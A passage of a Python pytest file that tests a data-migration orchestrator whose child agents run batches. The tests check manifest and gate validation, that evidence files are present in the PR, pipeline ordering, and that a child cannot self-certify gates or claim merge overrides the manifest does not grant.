    assert ns["unit_dependencies"]("u9") is None
    p = tmp_path / ".migration" / "units" / "u9" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(json.dumps({"routines": [CLOSE, LOG]}))
    assert ns["unit_dependencies"]("u9") == [CLOSE, LOG]
    p.write_text(json.dumps({"routines": []}))
    assert ns["unit_dependencies"]("u9") == []


def test_example_fixture_is_a_valid_analysis_whose_writes_the_check_accepts(tmp_path):
    ns = _functions()
    ns["ROOT"] = tmp_path
    p = tmp_path / ".migration" / "units" / "example" / "dependencies.json"
    p.parent.mkdir(parents=True)
    p.write_text(FIXTURE.read_text())
    routines = ns["unit_dependencies"]("example")
    assert routines and all(set(r) == {"routine", "reads", "writes", "calls"} for r in routines)
    assert any(r["calls"] for r in routines) and any(r["reads"] for r in routines)
    writes = ns["transitive_writes"](routines)
    assert len(writes) > 1 and writes > set().union(*(map(str.casefold, r["writes"]) for r in routines[:1]))
    called = {c.casefold() for r in routines for c in r["calls"]}
    roots = [r["routine"].rsplit(".", 1)[-1] for r in routines if r["routine"].casefold() not in called]
    assert roots and len(roots) < len(routines)
    b = {"id": "b", "units": ["example"], "write_targets": sorted(writes) + roots, "deploy_objects": roots, "brief": "b"}
    ns["check_dependencies"]([b])
    with pytest.raises(SystemExit, match="missing"):
        ns["check_dependencies"]([{**b, "write_targets": sorted(writes)[1:] + roots}])
    with pytest.raises(SystemExit, match="deploy_objects"):
        ns["check_dependencies"]([{**b, "write_targets": sorted(writes), "deploy_objects": []}])


# ---------------------------------------------------------------- gates as manifest rows (WS3.3)

@pytest.mark.parametrize("gates, message", [
    (None, "gates"),
    ([], "gates"),
    ("g-rows", "gates"),
    (["g-rows"], "gates"),
    ([{**GATE, "id": ""}], "id"),
    ([{**GATE, "id": "a b"}], "id"),
    ([dict(GATE), dict(GATE)], "unique"),
    ([{k: v for k, v in GATE.items() if k != "kind"}], "kind"),
    ([{**GATE, "kind": "vibes"}], "kind"),
    ([{k: v for k, v in GATE.items() if k != "status"}], "status"),
    ([{**GATE, "status": "done"}], "status"),
    ([{k: v for k, v in GATE.items() if k != "evidence"}], "evidence"),
    ([{**GATE, "evidence": None}], "evidence"),
    ([{**GATE, "status": "passed", "evidence": ""}], "evidence"),
    ([{**GATE, "status": "waived"}], "decision_id"),
    ([{**GATE, "status": "waived", "decision_id": "D-7"}], "decision_id"),
    ([{**GATE, "decision_id": "not a slug!"}], "decision_id"),
])
def test_validate_manifest_rejects_missing_or_malformed_gates(gates, message):
    validate_manifest = _functions()["validate_manifest"]
    batch = {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief"}
    if gates is not None:
        batch["gates"] = gates
    m = _manifest()
    m["batches"] = [batch]
    with pytest.raises(SystemExit, match=message):
        validate_manifest(m)


def test_validate_manifest_accepts_every_gate_kind_and_status():
    validate_manifest = _functions()["validate_manifest"]
    kinds = ("byte_compare", "export_file", "publish_leg", "row_parity", "structural", "custom")
    gates = [{"id": f"g-{k}", "kind": k, "status": "pending", "evidence": ""} for k in kinds]
    gates += [{"id": "g-p", "kind": "custom", "status": "passed", "evidence": "recon/u/result.json"},
              {"id": "g-f", "kind": "custom", "status": "failed", "evidence": ""},
              {"id": "g-w", "kind": "custom", "status": "waived", "evidence": "", "decision_id": "waive-g-w"}]
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "x", "gates": gates}]))


def _gate_batch(*gates):
    return {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b", "gates": list(gates)}


def _gate_report(**extra):
    return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": ["src/a.sql"], "one_line_summary": "ok", **extra}


def _run_gates(batch, report):
    ns = _batch_runtime()

    async def agent(prompt, **kwargs):
        return dict(report)

    ns["agent"] = agent
    return asyncio.run(ns["run_batch"](batch, asyncio.Semaphore(1), ns["Breaker"](3)))


def test_pass_with_a_gate_still_pending_is_downgraded():
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report())
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    assert "g-rows" in out["one_line_summary"] and "pending" in out["one_line_summary"]
    assert out["gates"] == [{**GATE, "decision_id": None}]


def test_child_reported_gate_pass_with_evidence_in_the_pr_closes_the_gate():
    out = _run_gates(_gate_batch(dict(GATE)),
                     _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/u/rows.md"}]))
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["gates"] == [{**GATE, "status": "passed", "evidence": ".migration/recon/u/rows.md", "decision_id": None}]


@pytest.mark.parametrize("reported", [
    [{"id": "g-rows", "status": "passed", "evidence": ""}],                       # no evidence
    [{"id": "g-rows", "status": "passed", "evidence": "rows checked, all good"}],  # a claim, not a file in the PR
    [{"id": "g-rows", "status": "passed", "evidence": "recon/u/rows.md"}],         # not under .migration/recon/<unit>/
    [{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/other_unit/rows.md"}],  # another unit's evidence
    [{"id": "g-rows", "status": "failed", "evidence": "3 rows differ"}],
    [{"id": "g-rows", "status": "waived", "evidence": "", "decision_id": "x"}],  # only the plan waives
    [{"id": "g-rows", "kind": "custom", "status": "passed", "evidence": "x"}],      # kind is not the child's to set
    [{"id": "g-other", "status": "passed", "evidence": "x"}],                     # undeclared gate
    [{"id": "g-rows", "status": "passed", "evidence": "x"}, {"id": "g-rows", "status": "passed", "evidence": "x"}],
    ["g-rows"],
    "g-rows passed",
    [{"status": "passed", "evidence": "x"}],
])
def test_child_cannot_pass_a_gate_without_evidence_waive_it_or_rename_it(reported):
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(gates=reported))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"


def test_a_plan_waived_gate_needs_nothing_from_the_child_and_cannot_be_flipped_by_it():
    batch = _gate_batch({**GATE, "id": "g-w", "kind": "export_file", "status": "waived", "decision_id": "waive-g-w"})
    out = _run_gates(batch, _gate_report())
    assert out["status"] == "PASS"
    assert [g["status"] for g in out["gates"]] == ["waived"]
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-w", "status": "failed", "evidence": "x"}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"


def test_a_plan_passed_gate_is_a_declaration_the_child_still_has_to_prove():
    """passed in the manifest says what the plan expects, not what happened: without the child's result and its
    evidence at the PR head the gate is unmet, and the child's evidence is what gets recorded."""
    batch = _gate_batch({**GATE, "status": "passed", "evidence": "plan/rows.md"})
    out = _run_gates(batch, _gate_report())
    assert out["status"] == "FAIL" and out["failure_class"] == "gates" and "g-rows" in out["one_line_summary"]
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": "plan/rows.md"}]))
    assert out["status"] == "FAIL" and out["failure_class"] == "gates"
    out = _run_gates(batch, _gate_report(gates=[{"id": "g-rows", "status": "passed", "evidence": ".migration/recon/u/rows.md"}]))
    assert out["status"] == "PASS"
    assert out["gates"] == [{**GATE, "status": "passed", "evidence": ".migration/recon/u/rows.md", "decision_id": None}]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"]({**ns["MANIFEST"]["batches"][0], "gates": batch["gates"]})
    assert "g-rows" in child


def test_evidence_in_pr_is_a_file_of_the_units_recon_dir_at_the_gated_head(tmp_path):
    ws = tmp_path / "ws"
    ns = _launch_ns(ws)
    (ws / ".migration/recon/u").mkdir(parents=True)
    subprocess.run(["git", "-C", str(ws), "init", "-q"], check=True)
    subprocess.run(["git", "-C", str(ws), "config", "user.name", "t"], check=True)
    subprocess.run(["git", "-C", str(ws), "config", "user.email", "t@example.com"], check=True)
    (ws / ".migration/recon/u/rows.md").write_text("rows\n")
    (ws / ".migration/recon/u/sub").mkdir()
    (ws / ".migration/recon/u/sub/x.md").write_text("x\n")
    (ws / "notes.md").write_text("n\n")
    subprocess.run(["git", "-C", str(ws), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(ws), "commit", "-qm", "evidence"], check=True)
    head = subprocess.run(["git", "-C", str(ws), "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
    evidence_in_pr = ns["evidence_in_pr"]
    assert evidence_in_pr(head, ".migration/recon/u/rows.md", ["u", "v"])
    assert evidence_in_pr(head, ".migration/recon/u/sub/x.md", ["u"])
    for path in (".migration/recon/u/missing.md",          # not in the PR
                 ".migration/recon/u",                     # a directory, not evidence
                 ".migration/recon/u/",
                 ".migration/recon/v/rows.md",             # v has no such file
                 ".migration/recon/w/rows.md",             # not a unit of the batch
                 ".migration/recon/u/../w/rows.md",
                 "notes.md",
                 "/" + str(ws / ".migration/recon/u/rows.md"),
                 "", None, 3):
        assert not evidence_in_pr(head, path, ["u", "v"]), path
    assert not evidence_in_pr(None, ".migration/recon/u/rows.md", ["u"])
    assert not evidence_in_pr(head[:-1] + ("0" if head[-1] != "0" else "1"), ".migration/recon/u/rows.md", ["u"])


def test_gate_check_runs_last_after_the_pr_gate_and_merge_authority():
    out = _run_gates(_gate_batch(dict(GATE)), {**_gate_report(), "pr_url": ""})
    assert out["failure_class"] == "missing_pr"
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report(merge_eligible=False))
    assert out["failure_class"] == "merge_authority"
    out = _run_gates(_gate_batch(dict(GATE)), _gate_report())
    assert out["failure_class"] == "gates"


def test_child_schema_and_prompts_carry_gates():
    tree = _tree()
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))
    gate = schema["properties"]["gates"]["items"]
    assert gate["properties"]["status"]["enum"] == ["passed", "failed"] and gate["required"] == ["id", "status", "evidence"]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "g-rows" in child and "row_parity" in child and "waived" in child
    verify = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1",
                                  "gates": [{**GATE, "status": "passed", "evidence": "recon/u/result.json"}]}])
    assert "g-rows" in verify and "recon/u/result.json" in verify


@pytest.mark.parametrize("caps", [
    "sp@x",                                   # not a dict
    {k: v for k, v in CAPS.items() if k != "identity"},
    _caps(identity=""),
    _caps(catalogs=[]),
    _caps(catalogs="mig"),
    _caps(catalogs=["mig", ""]),
    _caps(ready=False),
    {k: v for k, v in CAPS.items() if k != "ready"},
    _caps(ready=None),
    _caps(ready="true"),
    _caps(ready=1),
    {k: v for k, v in CAPS.items() if k != "guard_mode"},
    _caps(guard_mode="off"),
])
def test_validate_manifest_rejects_bad_capability_contract(caps):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(_manifest(capabilities=caps))


def test_validate_manifest_rejects_missing_capabilities():
    validate_manifest = _functions()["validate_manifest"]
    m = _manifest()
    del m["capabilities"]
    with pytest.raises(SystemExit, match="capabilities"):
        validate_manifest(m)


def test_validate_manifest_rejects_non_bool_auto_merge():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="auto_merge"):
        validate_manifest(_manifest(auto_merge="false"))


def test_validate_manifest_accepts_capability_contract():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest())
    validate_manifest(_manifest(auto_merge=True))
    validate_manifest(_manifest(capabilities=_caps(guard_mode="warn"), auto_merge=False))


def test_validate_manifest_allows_serial_wave_zero_only():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(wave=0, width=1))
    with pytest.raises(SystemExit, match="wave 0 is the serial shared-objects wave"):
        validate_manifest(_manifest(wave=0, width=2))


def test_validate_manifest_caps_the_brief_so_estate_config_stays_in_the_manifest():
    validate_manifest = _functions()["validate_manifest"]
    short = _manifest()
    short["batches"][0]["brief"] = "Units: u\nTargets: t\n" + "x" * 3900
    validate_manifest(short)
    long = _manifest()
    long["batches"][0]["brief"] = "host=adb-123.azuredatabricks.net " * 400
    with pytest.raises(SystemExit, match=r"batch b brief is 13200 chars; the cap is 4000"):
        validate_manifest(long)


def test_validate_manifest_requires_feature_branch_or_recorded_trunk_decision():
    validate_manifest = _functions()["validate_manifest"]
    missing = _manifest()
    del missing["base_branch"]
    with pytest.raises(SystemExit, match="manifest is missing 'base_branch'"):
        validate_manifest(missing)
    with pytest.raises(SystemExit, match="base_branch 'main' is the trunk"):
        validate_manifest(_manifest(base_branch="main"))
    validate_manifest(_manifest(base_branch="main", trunk_base_decision="trunk-2026-001"))


def test_child_prompt_embeds_capability_contract():
    ns = _prompt_ns(_manifest())
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--expect-identity sp-1" in text
    assert '"catalogs": ["mig"]' in text
    assert '"guard_mode": "block"' in text
    assert "BLOCKED" in text


def test_child_prompt_names_exactly_its_batch_units_for_the_doctor():
    # the child preflight covers its whole batch: the brief spells out one --unit per unit it owns,
    # so a shorter list would be a visible deviation, and the doctor resolves the mapping paths
    ns = _prompt_ns(_manifest(batches=[
        {"id": "b", "units": ["loans", "payments"], "write_targets": ["t"], "brief": "brief"},
        {"id": "c", "units": ["fees"], "write_targets": ["t2"], "brief": "brief"},
    ]))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert f"--expect-identity sp-1 --expect-host {HOST} --unit loans --unit payments" in text
    assert "--unit fees" not in text and "--mapping" not in text
    assert ".migration/units/<unit_id>/mapping_spec.json" in text


def test_child_brief_pins_the_contracts_workspace_host_for_the_doctor():
    """The expected principal can resolve against another workspace from a child's own profile or env;
    the brief makes the doctor compare the host the contract records, not only the identity."""
    ns = _prompt_ns(_manifest())
    assert f"--expect-host {HOST}" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    odd = _prompt_ns(_manifest(capabilities=_caps(host="https://x.net/a b")))
    assert "--expect-host 'https://x.net/a b'" in odd["child_prompt"](odd["MANIFEST"]["batches"][0])


@pytest.mark.parametrize("manifest", [
    _manifest(verify_depth="threshold"),   # verifier depth is a plan decision, never tolerance-driven
    _manifest(verify_depth="deep"),
    _manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief",
                        "verify_depth": "none"}]),
    _manifest(cost_estimate="cheap"),
])
def test_validate_manifest_rejects_bad_depth_or_cost(manifest):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="verify_depth|cost_estimate"):
        validate_manifest(manifest)


def test_validate_manifest_accepts_depth_knob_and_estimate():
    validate_manifest = _functions()["validate_manifest"]
    validate_manifest(_manifest(verify_depth="full", cost_estimate={"source_statements": 12}))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["u"], "write_targets": ["t"],
                                          "brief": "brief", "verify_depth": "sampled"}]))


def _prompt_ns(manifest):
    tree = _tree()
    names = {"verify_prompt", "batch_verify_depth", "batch_max_minutes", "child_prompt", "capability_block",
             "sum_cost", "cost_line", "close_prompt", "skill_text", "skill_file"}
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef) and node.name in names)
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"COST_KEYS", "MERGE_EVIDENCE_MODES", "RESYNC_CLASS"}
                    for t in node.targets))]
    ns = {"json": __import__("json"), "shlex": __import__("shlex"), "re": re, "WAVE": 1, "TAG": "0",
          "PLUGIN": WORKFLOW.parents[2],
          "REPO": "github.com/acme/target", "MANIFEST": manifest,
          "BATCHES": manifest["batches"], "VERIFY_DEPTH": manifest.get("verify_depth", "sampled"),
          "MAX_MINUTES": int(manifest.get("max_minutes", 45))}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    return ns


def test_verifier_prompt_carries_per_batch_depth_defaulting_to_sampled():
    m = _manifest(batches=[
        {"id": "b1", "units": ["u"], "write_targets": ["t1"], "brief": "x"},
        {"id": "b2", "units": ["v"], "write_targets": ["t2"], "brief": "y", "verify_depth": "full"}])
    ns = _prompt_ns(m)
    # the shape main() hands the verifier: {"batch": id, ...}, no verify_depth on the record
    passed = [{"batch": b["id"], "units": b["units"], "pr_url": "", "branch": ""} for b in m["batches"]]
    text = ns["verify_prompt"](passed)
    assert '"b1": "sampled"' in text and '"b2": "full"' in text
    assert "--depth" in text and "Never lower" in text and "recon_cost" in text
    ns2 = _prompt_ns(_manifest(verify_depth="full"))
    assert '"b": "full"' in ns2["verify_prompt"]([{"batch": "b", "units": ["u"]}])


def test_child_prompt_asks_for_recon_cost():
    ns = _prompt_ns(_manifest())
    assert "recon_cost" in ns["child_prompt"](ns["MANIFEST"]["batches"][0])


def test_capability_block_points_children_at_the_signed_wave_doctor_record():
    text = _prompt_ns(_manifest())["capability_block"](["u"])
    assert "--reuse-record .migration/waves/wave-0.doctor.json" in text
    assert "15" in text
    text = _prompt_ns(_manifest(doctor_max_age=30))["capability_block"](["u"])
    assert "doctor_max_age" in text and "30" in text


def test_a_degraded_wave_runs_only_the_structural_tier_in_verify():
    """A declared-DEGRADED wave's verifier runs the harness in `--mode structural` (Tier 0 only, no
    source rows) and marks PASS on that run's verdict; the merge-eligible full run is not asked for."""
    text = _prompt_ns(_manifest(degraded=True))["verify_prompt"](
        [{"batch": "b", "units": ["u"], "pr_url": ""}])
    assert "--mode structural" in text and "Tier 0" in text and "structural_drift" in text
    # structural_parity records catalogs it could not read as gaps without failing; a PASS over a gap is
    # unverified structure, so the verifier needs the gap-free run, not the verdict alone
    assert 'merge_block_reasons is exactly ["mode"]' in text
    assert "structural_gap" in text and "structure_unverifiable" in text
    assert "merge_eligible=true" not in text and "--depth" not in text
    assert "Mark a unit PASS only if you re-ran the harness in one of" not in text
    text = _prompt_ns(_manifest())["verify_prompt"](
        [{"batch": "b", "units": ["u"], "pr_url": ""}])
    assert "--mode structural" not in text and "merge_eligible=true" in text


def test_cost_line_compares_estimate_with_summed_actuals():
    m = _manifest(cost_estimate={"source_statements": 10, "source_rows_fetched": 1000})
    ns = _prompt_ns(m)
    results = [{"recon_cost": {"source_statements": 4, "target_statements": 2,
                               "source_rows_fetched": 300, "target_rows_fetched": 300, "elapsed_s": 1.2}},
               {"status": "BLOCKED"}]
    verify = {"recon_cost": {"source_statements": 3, "target_statements": None,
                             "source_rows_fetched": 100, "target_rows_fetched": 100, "elapsed_s": 0.8}}
    line = ns["cost_line"](results, verify)
    assert "estimated source_statements=10, source_rows_fetched=1000" in line
    assert "source_statements=7" in line and "source_rows_fetched=400" in line
    assert "target_statements=" not in line.split("actual")[1].split(",")[0]  # None side is omitted
    assert "harness time 2s" in line and "Verifier depth sampled" in line
    assert _prompt_ns(_manifest())["cost_line"]([{"status": "FAIL"}], None).startswith("Cost: no estimate")


PIPELINE_UPDATES = WORKFLOW.parents[1] / "target-routing" / "pipeline_updates.py"


def _pipeline_wave(tmp_path, batches, **manifest):
    waves = tmp_path / ".migration" / "waves"
    waves.mkdir(parents=True)
    path = waves / "wave-1.json"
    path.write_text(json.dumps({"wave": 1, "width": 4, "batches": batches, **manifest}))
    return path


def test_check_pipeline_updates_runs_the_script_on_the_manifest_and_returns_its_order(tmp_path):
    """The workflow can import nothing, so the pipeline check is the plugin's script run as a subprocess on
    the manifest; a clean run hands back `order` (later batch -> the earlier batches it waits for)."""
    check = _functions()["check_pipeline_updates"]
    path = _pipeline_wave(tmp_path, [{"id": "b1", "lakeflow_pipelines": ["p"]}, {"id": "b2", "lakeflow_pipelines": ["p"]}],
                         serialized_pipelines={"p": "ser-p"})
    assert check(PIPELINE_UPDATES, path) == {"b2": ["b1"]}
    assert check(PIPELINE_UPDATES, _pipeline_wave(tmp_path / "solo", [{"id": "b1", "lakeflow_pipelines": ["p"]}])) == {}


def test_check_pipeline_updates_halts_on_a_shared_pipeline_and_on_an_undeclared_batch(tmp_path):
    """Any non-zero exit halts the launch, `unsupported` included: a batch that declares no
    lakeflow_pipelines cannot be checked, and an unchecked wave is not a clean one."""
    check = _functions()["check_pipeline_updates"]
    shared = _pipeline_wave(tmp_path / "shared", [{"id": "b1", "lakeflow_pipelines": ["p"]}, {"id": "b2", "lakeflow_pipelines": ["p"]}])
    with pytest.raises(SystemExit, match=r"pipeline_updates.*'p'.*b1.*b2"):
        check(PIPELINE_UPDATES, shared)
    undeclared = _pipeline_wave(tmp_path / "undeclared", [{"id": "b1"}])
    with pytest.raises(SystemExit, match="unsupported.*b1"):
        check(PIPELINE_UPDATES, undeclared)


def test_check_pipeline_updates_halts_when_the_script_is_missing_or_crashes(tmp_path):
    check = _functions()["check_pipeline_updates"]
    path = _pipeline_wave(tmp_path, [{"id": "b1", "lakeflow_pipelines": []}])
    with pytest.raises(SystemExit, match="pipeline_updates.py"):
        check(tmp_path / "nowhere" / "pipeline_updates.py", path)
    broken = tmp_path / "pipeline_updates.py"
    broken.write_text("raise RuntimeError('boom')\n")
    with pytest.raises(SystemExit, match="boom"):
        check(broken, path)
    silent = tmp_path / "silent.py"
    silent.write_text("print('not json')\n")
    with pytest.raises(SystemExit, match="not json"):
        check(silent, path)


def test_run_batch_waits_for_the_batches_its_pipeline_order_names(tmp_path):
    """Serialization is enforced, not just authorized: with width 2 and order {b2: [b1]}, b2's child
    launches only after b1's finished, while b3 (no order) runs alongside b1."""
    namespace = _batch_runtime()
    events = []

    async def agent(prompt, **kwargs):
        events.append(("start", kwargs["label"]))
        if kwargs["label"] == "b1":
            await asyncio.sleep(0.05)
        events.append(("end", kwargs["label"]))
        return {"status": "FAIL", "recon_verdict": "NOT_RUN", "failure_class": kwargs["label"], "one_line_summary": "x"}

    namespace["agent"] = agent
    batches = [{"id": i, "units": ["u"], "write_targets": ["t"], "brief": "b"} for i in ("b1", "b2", "b3")]

    async def exercise():
        sem, breaker = asyncio.Semaphore(2), namespace["Breaker"](9)
        done = {b["id"]: asyncio.Event() for b in batches}
        order = {"b2": ["b1"]}
        return await asyncio.gather(*(namespace["run_batch"](b, sem, breaker, done=done[b["id"]],
                                                            waits=[done[d] for d in order.get(b["id"], [])])
                                      for b in batches))

    asyncio.run(exercise())
    assert events.index(("start", "b2")) > events.index(("end", "b1"))
    assert events.index(("start", "b3")) < events.index(("end", "b1"))


def test_run_batch_releases_its_waiters_even_when_the_breaker_held_it_back():
    namespace = _batch_runtime()
    namespace["agent"] = None  # never reached

    async def exercise():
        breaker = namespace["Breaker"](1)
        breaker.record("x")
        done = asyncio.Event()
        out = await namespace["run_batch"](dict(BATCH), asyncio.Semaphore(1), breaker, done=done)
        return out, done.is_set()

    out, released = asyncio.run(exercise())
    assert out["status"] == "NOT_LAUNCHED" and released


def test_pass_without_pr_is_downgraded():
    namespace = _batch_runtime()

    async def agent(prompt, **kwargs):
        return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
                "branch": "feature/no-url", "one_line_summary": "passed"}

    namespace["agent"] = agent

    async def exercise():
        breaker = namespace["Breaker"](3)
        return await namespace["run_batch"](
            {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"},
            asyncio.Semaphore(1), breaker)

    output = asyncio.run(exercise())
    assert output["status"] == "FAIL"
    assert output["failure_class"] == "missing_pr"


BATCH = {"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "b"}


def _run_one(namespace, report):
    async def agent(prompt, **kwargs):
        return dict(report)

    namespace["agent"] = agent

    async def exercise():
        return await namespace["run_batch"](
            dict(BATCH),
            asyncio.Semaphore(1), namespace["Breaker"](3))

    return asyncio.run(exercise())


@pytest.mark.parametrize("mode", ["live", "snapshot", "transactional"])
def test_pass_with_merge_evidence_mode_is_kept(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode, "merge_eligible": True,
                                      "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": ["src/a.sql"],
                                      "one_line_summary": "ok"})
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["merge_authority"] == {"kind": "harness", "decision_id": None}


@pytest.mark.parametrize("mode", ["fixture", "continuous", None])
def test_pass_without_merge_evidence_is_downgraded(mode):
    out = _run_one(_batch_runtime(), {"status": "PASS", "recon_verdict": "PASS", "recon_mode": mode, "merge_eligible": True,
                                      "pr_url": "https://example/pr/1", "branch": "f", "one_line_summary": "ok"})
    assert out["status"] == "FAIL" and out["failure_class"] == "non_merge_evidence"


# ---------------------------------------------------------------- merge authority (WS3.2)

_pass_nomerge = {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "pr_url": "https://example/pr/1",
                 "branch": "f", "changed_paths": ["src/a.sql"],
                 "one_line_summary": "ok"}


def _ns_with_overrides(entries):
    ns = _batch_runtime()
    ns["MANIFEST"] = {"merge_overrides": entries}
    return ns


@pytest.mark.parametrize("report", [
    _pass_nomerge,
    {**_pass_nomerge, "merge_eligible": "true"},
    {**_pass_nomerge, "merge_eligible": 1},
    {**_pass_nomerge, "merge_eligible": False},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "harness", "decision_id": "mo-u"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "other-d"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "mo-z"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "7 mo"}},
    {**_pass_nomerge, "merge_eligible": False, "merge_authority": "mo-u"},
])
def test_pass_without_merge_eligible_true_needs_the_manifests_override(report):
    out = _run_one(_batch_runtime(), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"
    assert "merge_overrides" in out["one_line_summary"] and out["one_line_summary"].startswith("PASS downgraded")
    assert "merge_authority" not in out or out["merge_authority"]["kind"] != "human_override"


def test_manifest_override_entry_for_the_batches_units_keeps_the_pass():
    out = _run_one(_batch_runtime(), {**_pass_nomerge, "merge_eligible": False,
                                      "merge_authority": {"kind": "human_override", "decision_id": "mo-u"}})
    assert out["status"] == "PASS" and "failure_class" not in out
    assert out["merge_authority"] == {"kind": "human_override", "decision_id": "mo-u"}


def test_override_does_not_bypass_the_merge_evidence_mode_gate():
    out = _run_one(_batch_runtime(), {**_pass_nomerge, "recon_mode": "fixture", "merge_eligible": False,
                                      "merge_authority": {"kind": "human_override", "decision_id": "mo-u"}})
    assert out["status"] == "FAIL" and out["failure_class"] == "non_merge_evidence"


def test_override_claim_with_no_manifest_entry_fails_closed():
    ns = _ns_with_overrides([])
    out = _run_one(ns, {**_pass_nomerge, "merge_eligible": False,
                        "merge_authority": {"kind": "human_override", "decision_id": "mo-u"}})
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"


def test_merge_override_for_is_the_single_entry_covering_every_unit():
    merge_override_for = _batch_runtime()["merge_override_for"]
    assert merge_override_for(["u"], [{"decision": "mo-u", "units": ["u"]}]) == {"decision": "mo-u", "units": ["u"]}
    # an entry may name more units than the batch asks for; the claim still cites its decision
    assert merge_override_for(["u"], [{"decision": "mo-all", "units": ["u", "v"]}]) == {"decision": "mo-all", "units": ["u", "v"]}
    # two entries both covering the batch's units: no single authority, claim must fail closed
    assert merge_override_for(["u"], [{"decision": "a", "units": ["u"]}, {"decision": "b", "units": ["u"]}]) is None
    # an entry covering only some of the batch's units clears nothing
    assert merge_override_for(["u", "v"], [{"decision": "a", "units": ["u"]}]) is None
    # no merge_overrides key, a non-list value, or malformed rows clear nothing either
    assert merge_override_for(["u"], None) is None
    for bad in ("x", [{"decision": "a"}], [{"units": ["u"]}], ["a"]):
        assert merge_override_for(["u"], bad) is None


def test_an_unscoped_override_forgives_every_policy_class_and_never_data():
    scope_covers = _batch_runtime()["scope_covers"]
    assert scope_covers(None, {"u": ["rerun_policy", "privilege_visibility", "structural", "evidence"]})
    assert not scope_covers(None, {"u": ["data"]}) and not scope_covers(None, {"u": ["rerun_policy", "data"]})
    assert not scope_covers(None, {"u": ["rerun_policy"], "v": None})   # unrecorded: cannot be shown non-data
    assert scope_covers(["data"], {"u": ["data"]}) and not scope_covers(["data"], {"u": ["rerun_policy"]})
    assert scope_covers(None, {})


def test_a_scoped_override_covers_only_the_blocker_classes_it_names():
    def ns_with(entries, classes):
        ns = _ns_with_overrides(entries)
        ns["unit_recon"] = lambda head, units: {u: (False, classes) for u in units}
        return ns

    unscoped = [{"decision": "mo-u", "units": ["u"]}]
    scoped = [{"decision": "mo-u", "units": ["u"], "blocker_classes": ["rerun_policy"]}]
    named = [{"decision": "mo-u", "units": ["u"], "blocker_classes": ["data", "rerun_policy"]}]
    report = {**_pass_nomerge, "merge_eligible": False, "merge_authority": {"kind": "human_override", "decision_id": "mo-u"}}
    out = _run_one(ns_with(scoped, ["rerun_policy"]), report)
    assert out["status"] == "PASS" and out["merge_authority"]["decision_id"] == "mo-u"
    # a data blocker is forgiven only by an entry that names data: the unscoped entry does not, so the halt names it
    out = _run_one(ns_with(unscoped, ["data", "rerun_policy"]), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"
    assert "mo-u" in out["one_line_summary"] and "(unscoped)" in out["one_line_summary"]
    out = _run_one(ns_with(scoped, ["data", "rerun_policy"]), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"
    assert "mo-u" in out["one_line_summary"] and "data" in out["one_line_summary"]
    out = _run_one(ns_with(named, ["data", "rerun_policy"]), report)
    assert out["status"] == "PASS" and out["merge_authority"]["decision_id"] == "mo-u"
    out = _run_one(ns_with(named, None), report)   # even the entry naming data cannot cover what was not recorded
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority" and "unrecorded" in out["one_line_summary"]
